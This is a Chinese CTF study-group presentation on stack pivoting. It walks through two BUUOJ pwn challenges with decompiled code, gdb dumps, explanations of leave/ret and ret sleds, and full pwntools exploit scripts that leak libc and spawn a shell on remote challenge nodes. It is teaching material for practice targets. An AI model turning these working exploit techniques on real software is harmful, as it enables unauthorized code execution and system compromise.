---
title: 组会
date: 2026-05-15
pwn: 组会
---

~~🙃🙃我在想要不要水完这个组会😆😆,还是详细的讲呢🙃🙃~~
---

---
# **栈是程序的临时舞台，但舞台不够大时，我们就自己搭一个**

---
# 一.前景导入
---
## 
## 1.实例：[buu的ciscn_2019_s_4](https://buuoj.cn/challenges#ciscn_2019_s_4)
## 2.*关键代码分析*
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  puts("Welcome, my friend. What's your name?");
  vul();
  return 0;
}
```
```c
int hack()
{
  return system("echo flag");
}
```
```c
int vul()
{
  char s[40]; // [esp+0h] [ebp-28h] BYREF

  memset(s, 0, 0x20u);
  read(0, s, 0x30u);
  printf("Hello, %s\n", s);
  read(0, s, 0x30u);
  return printf("Hello, %s\n", s);
}
```
- ~~吓哭了😰😰😰，这道题溢出只有0x30-0x28=8😭😭~~
-  ~~传统的栈溢出就没法用了吗😵😵~~
---
## 3.通过分析，发现没有`/bin/sh`或者`sh`字符串，并且最关键的是溢出空间0x30-0x28-0x4=4
- 所以这并不能像以前那样构造payload
- 也就是要换个地方来控制执行流程即***换地方来getshell***
- ~~那怎么办呢😳😳😳~~
---
---
---
# 二.栈迁移原理,推荐一个博客[栈迁移的原理&&实战运用](https://www.cnblogs.com/ZIKH26/articles/15817337.html)
---
~~这个博客还是讲得挺好的🙃🙃~~
 ## 1. 栈迁移前置知识之*asm汇编*[[函数栈帧]]
## 2.流程
- 详解函数返回时的尾声,即`leave`到底做了什么，这就是标准的尾声
    ![[Pasted image 20260325123631.png]]
    `ret`就是把栈顶的内容弹进了`eip`（就是下一条指令执行的地址)
    ![[Pasted image 20260325123834.png]]
    ---

## 3. pwn手段
- 利用溢出修改`ebp`的内容，修改成我们要去的地址，并且把返回地址填充为leave,ret; 
- 不难想到，我们可以把它执行流程迁移到栈底
- 此时我们只需把getshell的payload放在栈底
   ```python
    payload = aaaa+system+0+/bin/sh_addr+/bin/sh+offset+栈底(ebp的内容)+leave_ret
   ```
## 4. pwn流程解析
   ![[Pasted image 20260325125119.png]]
   ![[Pasted image 20260325125127.png]]
   ---
   ## 5. 总结
   ​ 最后来总结一下原理，核心是利用两次的leave;ret，**第一次leave ret;将ebp给放入我们指定的位置（这个位置的就是迁移后的所在位置）**，**第二次将esp也迁移到这个位置，并且pop ebp之后，esp也指向了下一个内存单元（此时这里放的就是system函数的plt地址）**，最终成功GetShell🥰🥰🥰🥰。
## 6.* 原理如上，遇见不同栈迁移的题目也是根本核心万变不离其宗。*
---
---
---

# 三.复现
---
## 1.先拿到[ebp]即调用者保存的地址
- gdb调试
  ```
  00:0000│ esp 0xffffc620 —▸ 0x80486ca ◂— dec eax /* 'Hello, %s\n' */
01:0004│-034 0xffffc624 —▸ 0xffffc630 ◂— 0x61612762 ("b'aa")
02:0008│-030 0xffffc628 ◂— 0x30 /* '0' */
03:000c│-02c 0xffffc62c —▸ 0x804a044 (stdout@@GLIBC_2.0) —▸ 0xf7f93ce0 (_IO_2_1_stdout_) ◂— 0xfbad2887
04:0010│-028 0xffffc630 ◂— 0x61612762 ("b'aa")
05:0014│-024 0xffffc634 ◂— 0x61616161 ('aaaa')
... ↓        8 skipped
0e:0038│ ebp 0xffffc658 ◂— 0xa274261 ("aB'\n")
  ```
- 看`[ebp]`和`ebp`的关系
  ```
  pwndbg> stack 40
00:0000│ esp 0xffffc620 —▸ 0x80486ca ◂— dec eax /* 'Hello, %s\n' */
01:0004│-034 0xffffc624 —▸ 0xffffc630 ◂— 'haha\n'
02:0008│-030 0xffffc628 ◂— 0x30 /* '0' */
03:000c│-02c 0xffffc62c —▸ 0x804a044 (stdout@@GLIBC_2.0) —▸ 0xf7f93ce0 (_IO_2_1_stdout_) ◂— 0xfbad2887
04:0010│-028 0xffffc630 ◂— 'haha\n'
05:0014│-024 0xffffc634 ◂— 0xa /* '\n' */
06:0018│-020 0xffffc638 ◂— 0
... ↓        5 skipped
0c:0030│-008 0xffffc650 —▸ 0x80486d8 ◂— push edi /* "Welcome, my friend. What's your name?" */
0d:0034│-004 0xffffc654 ◂— 0
0e:0038│ ebp 0xffffc658 —▸ 0xffffc668 —▸ 0xf7ffcca0 (_rtld_global_ro) ◂— 0
  ```
- 即得出ebp=[ebp]-0x10
## 2.写payload
```python
payload = (b'aaaa'+p32(system)+p32(0)+p32(ebp-0x28)+b'/bin/sh').ljust(0x28,b'\x00')+p32(ebp-0x38)+p32(leave_ret)
```
## 3.exp
```python
from pwn import *
context.binary = './ciscn_s_4'
context.log_level = 'debug'
#p = process('./ciscn_s_4')
p = remote('node5.buuoj.cn',28336)

leave_ret = 0x08048562
system = 0x8048400

p.recv()
#p.sendline(b'a'*0x27+b'B')
payload0 =b'a'*0x27+b'B'
p.send(payload0)
p.recvuntil('B')
ebp = u32(p.recv(4))
p.recv()
payload = (b'aaaa'+p32(system)+p32(0)+p32(ebp-0x28)+b'/bin/sh').ljust(0x28,b'\x00')+p32(ebp-0x38)+p32(leave_ret)
p.sendline(payload)
p.interactive()
```
---
---
---
# 四.调试，复现，深入理解栈迁移执行流程
---
## 1. *相关调试命令*:
   [[栈溢出-调试理解栈溢出]]
   ## 2.复现
   ~~看我操作，😃~~
#  五.x86-64+bss段
---
 - ~~刚才举例的是32位的🤔🤔，但32位早过时了~~ 
 ## 1. 现在的题目大多数都是64位，而且还没讲bss段呢，bss段的有些不一样🙄🙄 , 所以应该还得讲64位和bss段
 ## 2.题目来源：[gyctf_2020_borrowstack](https://buuoj.cn/challenges#gyctf_2020_borrowstack)

## 3.exp
```python
from pwn import *
context.binary = './gyctf_2020_borrowstack'
context.log_level = 'debug'
#p = process('./gyctf_2020_borrowstack')
p = remote("node5.buuoj.cn",29120)
libc = ELF('./libc-2.23_ubuntu16_64bit.so')
elf = context.binary

gadget = 0x4526a
pop_rdi = 0x0000000000400703
leave_ret = 0x0000000000400699
bss = 0x601080
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.sym['main']
ret = 0x4004c9

p.recv()
payload1 = b'a'*0x60+p64(bss)+p64(leave_ret)
p.send(payload1)
payload2 = p64(ret)*20+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
p.sendline(payload2)
p.recvuntil(b'now!\n')
addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) 
print(addr)

base = addr-libc.sym['puts']
getshell = base+gadget
payload3 = b'a'*0x68+p64(getshell)
p.send(payload3)
p.interactive()
```
---
---
---

#  六.迁移核心解析：`ret` sled 与 ROP 链执行

---

## 1. 为什么需要 `ret` sled？

### 1.1 保护 `.got.plt`
- 栈迁移后 `rsp = 0x601080`（`bank` 地址）  
- 若不抬高栈，返回 `main` 后 `sub rsp,0x60` 使 `rsp` 降至 `0x601018`，落入 `.got.plt` 段（`0x601000~0x601038`），覆盖 GOT 表，程序崩溃。  
- **`ret*20`** 将 `rsp` 抬高到 `0x601120`，`sub rsp,0x60` 后为 `0x6010c0`，安全。

### 1.2 满足 one_gadget 约束
- 选用 `0x4526a`，约束 `[rsp+0x30] == NULL`。  
- 抬高栈后 `rsp+0x30` 落在 bss 段未覆盖的零区域，自动满足。

### 1.3 对齐第三次 payload
- 第三次 payload 需精确覆盖 `main` 返回地址（偏移 `0x68`）。`ret*20` 使返回地址与 payload 中的 one_gadget 位置对齐。

### 1.4 为什么是 20？
- 理论最小安全值：  
  `(0x601038 - 0x601080 + 0x68) / 8 = 4` → 至少 5 个 `ret`。  
- 20 是调试稳定值，兼顾安全、约束和偏移，常见经验值。

---

## 2. ROP 链执行与 `main` 栈帧重建

### 2.1 栈迁移后 `rsp` 变化

| 步骤 | `rsp` 值 |
|------|----------|
| 初始（迁移后） | `0x601080` |
| 执行 20 次 `ret` | `0x601120` |
| `pop rdi; ret` | `0x601128` |
| `puts_plt` 返回 | `0x601130` |
| `ret` 到 `main` | `0x601138` |

### 2.2 进入 `main` 后栈帧重建

```asm
push rbp          ; rsp = 0x601130
mov rbp, rsp      ; rbp = 0x601130
sub rsp, 0x60     ; rsp = 0x6010d0
```
- 局部变量 `buf` 地址：`rbp - 0x60 = 0x6010d0`  
- 返回地址位于：`rbp + 8 = 0x601138`

### 2.3 第三次输入覆盖返回地址

```python
payload3 = b'a'*0x68 + p64(one_gadget)   # 长度 0x70
```
- `read(0, buf, 0x70)` 写入 `buf`，`one_gadget` 写入 `0x6010d0 + 0x68 = 0x601138`，即返回地址位置。  
- `main` 返回时 `ret` 跳转到 one_gadget，getshell。

---

## 3. 核心代码片段

```python
# 第一次溢出：迁移栈
payload1 = b'a'*0x60 + p64(0x601080) + p64(0x400699)
p.send(payload1)

# 第二次输入：ret sled + ROP 链
payload2 = p64(0x4004c9)*20 + p64(0x400703) + p64(0x601018) + p64(0x4004e0) + p64(0x400626)
p.sendline(payload2)

# 泄露地址
puts_ad = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = puts_ad - libc.sym['puts']
one_gadget = libc_base + 0x4526a

# 第三次输入：覆盖返回地址
payload3 = b'a'*0x68 + p64(one_gadget)
p.send(payload3)
```

---

## 4. 关键总结

- **`ret` sled 本质**：通过连续 `ret` 指令主动提升 `rsp`，为后续函数调用创造安全栈环境。  
- **必须抬高栈的原因**：避开 GOT 表、满足 one_gadget 约束、保证第三次 payload 对齐。  
- **`ret` 数量选择**：理论最小值 + 调试稳定值（本题为 20）。
---
---
# **栈迁移的本质，是告诉 CPU：“别管原来的栈了，看我给你指的新舞台。”**
---
---
# 七.总结
## 1.*琢磨这些底层知识*，还有*程序执行流程*，**不要只会记住payload的构造**，感觉这样确实很像*脚本小子*。
## 2. pwn的精髓应该是在于***调试***，看看**寄存器**和**内存**上的情况,通过调试，我们能看到**栈迁移的完整过程**
## 3.同时，pwn是一门要**沉淀**的艺术，之前信邪面试学长说过
> 学pwn周期非常长，出成绩比其他方向要慢很多
## 4.计算机就是**二进制的世界**,*网络服务*的底层也是*二进制*，web服务也是建立在二进制的基础上的。
像‘国产之光'某为的芯片和软件吹的再牛皮本质也是跑在二进制，只是cpu架构不一样，函数传参规则可能不一样，本质也都是机器码
---
---
---
# **给我一个溢出点，我能撬动整个系统。**